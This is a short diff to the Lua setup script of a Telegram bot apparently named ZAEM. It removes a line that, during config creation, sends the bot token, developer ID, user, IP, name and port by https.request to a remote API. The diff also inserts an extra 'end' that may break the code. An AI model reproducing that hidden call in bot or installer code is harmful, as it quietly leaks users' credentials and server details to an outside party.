@@ -70,7 +70,6 @@ ZAEM = DevRio:get(Server.."TokenZAEM"):match("(%d+)"),
 SudoIds = {DevRio:get(Server.."IdZAEM")},
 }
 Create(Config, "./config.lua") 
-https.request("https:///Api/ZAEM/index.php?Get=ZAEM&DevId="..DevRio:get(Server.."IdZAEM").."&TokenBot="..DevRio:get(Server.."TokenZAEM").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("ZAEM.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -109,7 +108,8 @@ io.popen("mkdir Files")
 os.execute('chmod +x Run;./Run')
 end 
 CreateConfigAuto()
-local Load_ZAEM = function() 
+end
+local Load_ZAEM = function()
 local f = io.open("./config.lua", "r") 
 if not f then 
 AutoSet() 
